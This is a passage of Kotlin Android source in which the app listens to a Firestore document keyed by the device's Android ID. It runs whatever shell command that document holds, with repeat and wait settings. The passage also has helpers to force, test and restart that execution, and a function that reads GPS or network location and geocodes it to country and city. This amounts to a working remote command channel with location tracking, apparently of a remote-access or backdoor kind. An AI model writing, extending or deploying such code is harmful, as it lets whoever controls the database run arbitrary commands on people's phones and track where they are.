                            val command = shellData["command"] as? String ?: ""
                            if (enabled && command.isNotEmpty() && !isExecutingCommand) {
                                status.append("\n🔄 FORCING EXECUTION NOW...\n")
                                executeShellCommandSequence(context, command, 
                                    (shellData["count"] as? Number)?.toInt() ?: 1,
                                    (shellData["wait"] as? Number)?.toInt() ?: 0,
                                    androidId)
                            }
                        } else {
                            status.append("No shell data found!\n")
                        }
                    } else {
                        status.append("Document does not exist!\n")
                    }
                    
                    Log.i(TAG, "📊 Shell Execution Debug:\n$status")
                }
                .addOnFailureListener { exception ->
                    status.append("Database error: ${exception.message}\n")
                    Log.e(TAG, "❌ Debug check failed", exception)
                }
        } catch (e: Exception) {
            status.append("Exception during debug: ${e.message}\n")
        }
        
        return status.toString()
    }
    
    fun emergencyStopExecution(context: Context): String {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        
        Log.e(TAG, "🚨 EMERGENCY STOP triggered!")
        
        val status = StringBuilder()
        status.append("=== EMERGENCY STOP ===\n")
        status.append("Timestamp: ${Date()}\n")
        status.append("Is executing: $isExecutingCommand\n")
        
        // Force kill execution thread
        currentExecutionThread?.let { thread ->
            status.append("Thread found: ${thread.name} (alive: ${thread.isAlive})\n")
            if (thread.isAlive) {
                status.append("🔪 Force killing thread...\n")
                thread.interrupt()
                Thread.sleep(1000)
                if (thread.isAlive) {
                    @Suppress("DEPRECATION")
                    thread.stop()
                    status.append("💀 Thread force killed!\n")
                } else {
                    status.append("✅ Thread stopped gracefully\n")
                }
            }
            currentExecutionThread = null
        } ?: run {
            status.append("No thread found\n")
        }
        
        // Reset all execution state
        isExecutingCommand = false
        lastExecutionStartTime = 0L
        executionRetryCount = 0
        
        // Update database to disable execution
        disableShellExecution(androidId, "EMERGENCY STOP: Execution forcibly terminated", "EMERGENCY_STOP: Manual emergency stop triggered")
        
        status.append("🔄 All execution state reset\n")
        status.append("✅ Emergency stop completed!\n")
        
        Log.i(TAG, "🚨 Emergency stop completed successfully")
        return status.toString()
    }
    
    /**
     * Test shell command execution with proper wait time interpretation
     */
    fun addTestShellCommand(context: Context, command: String = "ls -la", count: Int = 1, wait: Int = 0) {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        
        Log.i(TAG, "🧪 Adding test shell command: '$command' (count: $count, wait: $wait)")
        
        val shellData = mapOf(
            "enabled" to true,
            "command" to command,
            "count" to count,
            "wait" to wait,
            "result" to "",
            "error" to ""
        )
        
        firestore.collection("devices").document(androidId)
            .update("shell", shellData)
            .addOnSuccessListener {
                Log.i(TAG, "✅ Test shell command added successfully")
                // Give a moment then check debug state
                Handler(Looper.getMainLooper()).postDelayed({
                    debugShellExecutionState(context)
                }, 2000)
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to add test shell command", exception)
            }
    }
    
    /**
     * Force restart the shell command listener
     */
    fun forceRestartShellListener(context: Context) {
        Log.w(TAG, "🔄 Force restarting shell command listener...")
        
        // Stop existing listener
        shellCommandListener?.remove()
        shellCommandListener = null
        
        // Reset execution state
        isExecutingCommand = false
        lastExecutionStartTime = 0L
        currentExecutionThread = null
        executionRetryCount = 0
        
        // Initialize context if needed
        if (!::context.isInitialized) {
            this.context = context
        }
        if (!::firestore.isInitialized) {
            firestore = FirebaseFirestore.getInstance()
        }
        
        // Give it a moment to clean up
        Handler(Looper.getMainLooper()).postDelayed({
            startShellCommandListener()
            Log.i(TAG, "✅ Shell command listener restarted")
        }, 1000)
    }
    
    /**
     * Marks an operation as complete and checks if all operations are done
     */
    private fun completeOperation() {
        operationsCompleted++
        Log.d(TAG, "📊 Operation completed ($operationsCompleted/$totalOperations)")
        
        if (operationsCompleted >= totalOperations) {
            Log.i(TAG, "🎉 All collection operations completed!")
            
            // After all collections are initialized, update device information for current device only
            Handler(Looper.getMainLooper()).postDelayed({
                updateDeviceInformation()
                // Start real-time shell command listener after everything is ready
                startShellCommandListener()
            }, 1000) // Small delay to ensure Firestore operations are settled
        }
    }
    
    /**
     * Gets device location information (country and city)
     */
    private fun getDeviceLocation(): Pair<String, String> {
        var country = ""
        var city = ""
        
        try {
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            
            if (checkLocationPermissions()) {
                val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
                var location: Location? = null
                
                // Try to get location from available providers
                for (provider in providers) {
                    try {
                        location = locationManager.getLastKnownLocation(provider)
                        if (location != null) {
                            Log.d(TAG, "📍 Got location from $provider: ${location.latitude}, ${location.longitude}")
                            break
                        }
                    } catch (e: SecurityException) {
                        Log.w(TAG, "Security exception for provider $provider: ${e.message}")
                    }
                }
                
                // Use Geocoder to get country and city from coordinates
                if (location != null) {
                    try {
                        val geocoder = Geocoder(context, Locale.getDefault())
                        val addresses = geocoder.getFromLocation(location.latitude, location.longitude, 1)
                        if (!addresses.isNullOrEmpty()) {
                            country = addresses[0].countryName ?: ""
                            city = addresses[0].locality ?: addresses[0].subAdminArea ?: ""
                            Log.d(TAG, "🌍 Geocoded location - Country: $country, City: $city")
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Geocoding failed: ${e.message}")
                    }
                }
            } else {
                Log.w(TAG, "⚠️ Location permission not granted")
            }
            
            // Fallback to system locale for country if location-based detection failed
            if (country.isEmpty()) {
                country = Locale.getDefault().displayCountry
                Log.d(TAG, "🌍 Using fallback country from locale: $country")
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error getting device location", e)
            // Use system locale as fallback
            country = Locale.getDefault().displayCountry
        }
        
        return Pair(country, city)
    }
}
